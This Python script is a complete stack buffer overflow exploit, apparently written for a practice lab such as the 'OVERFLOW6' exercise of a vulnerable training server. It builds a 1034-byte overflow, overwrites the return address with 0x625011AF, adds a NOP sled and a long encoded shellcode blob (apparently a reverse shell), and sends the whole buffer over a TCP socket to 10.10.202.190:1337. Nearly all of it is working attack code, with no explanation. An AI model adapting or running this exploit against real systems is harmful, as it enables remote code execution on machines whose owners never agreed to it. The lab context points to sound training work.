#!/usr/bin/env python3

import socket

ip = "10.10.202.190"
port = 1337

prefix = "OVERFLOW6 "
offset = 1034
overflow = "A" * offset
# 625011AF
retn = "\xAF\x11\x50\x62"
padding = "\x90" * 16
payload = ("\xb8\x1a\xa8\xb8\xe1\xdb\xc1\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
"\x52\x83\xc3\x04\x31\x43\x0e\x03\x59\xa6\x5a\x14\xa1\x5e\x18"
"\xd7\x59\x9f\x7d\x51\xbc\xae\xbd\x05\xb5\x81\x0d\x4d\x9b\x2d"
"\xe5\x03\x0f\xa5\x8b\x8b\x20\x0e\x21\xea\x0f\x8f\x1a\xce\x0e"
"\x13\x61\x03\xf0\x2a\xaa\x56\xf1\x6b\xd7\x9b\xa3\x24\x93\x0e"
"\x53\x40\xe9\x92\xd8\x1a\xff\x92\x3d\xea\xfe\xb3\x90\x60\x59"
"\x14\x13\xa4\xd1\x1d\x0b\xa9\xdc\xd4\xa0\x19\xaa\xe6\x60\x50"
"\x53\x44\x4d\x5c\xa6\x94\x8a\x5b\x59\xe3\xe2\x9f\xe4\xf4\x31"
"\xdd\x32\x70\xa1\x45\xb0\x22\x0d\x77\x15\xb4\xc6\x7b\xd2\xb2"
"\x80\x9f\xe5\x17\xbb\xa4\x6e\x96\x6b\x2d\x34\xbd\xaf\x75\xee"
"\xdc\xf6\xd3\x41\xe0\xe8\xbb\x3e\x44\x63\x51\x2a\xf5\x2e\x3e"
"\x9f\x34\xd0\xbe\xb7\x4f\xa3\x8c\x18\xe4\x2b\xbd\xd1\x22\xac"
"\xc2\xcb\x93\x22\x3d\xf4\xe3\x6b\xfa\xa0\xb3\x03\x2b\xc9\x5f"
"\xd3\xd4\x1c\xcf\x83\x7a\xcf\xb0\x73\x3b\xbf\x58\x99\xb4\xe0"
"\x79\xa2\x1e\x89\x10\x59\xc9\xbc\xe9\x78\xfb\xa9\xf3\x7a\xea"
"\x75\x7d\x9c\x66\x96\x2b\x37\x1f\x0f\x76\xc3\xbe\xd0\xac\xae"
"\x81\x5b\x43\x4f\x4f\xac\x2e\x43\x38\x5c\x65\x39\xef\x63\x53"
"\x55\x73\xf1\x38\xa5\xfa\xea\x96\xf2\xab\xdd\xee\x96\x41\x47"
"\x59\x84\x9b\x11\xa2\x0c\x40\xe2\x2d\x8d\x05\x5e\x0a\x9d\xd3"
"\x5f\x16\xc9\x8b\x09\xc0\xa7\x6d\xe0\xa2\x11\x24\x5f\x6d\xf5"
"\xb1\x93\xae\x83\xbd\xf9\x58\x6b\x0f\x54\x1d\x94\xa0\x30\xa9"
"\xed\xdc\xa0\x56\x24\x65\xc0\xb4\xec\x90\x69\x61\x65\x19\xf4"
"\x92\x50\x5e\x01\x11\x50\x1f\xf6\x09\x11\x1a\xb2\x8d\xca\x56")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")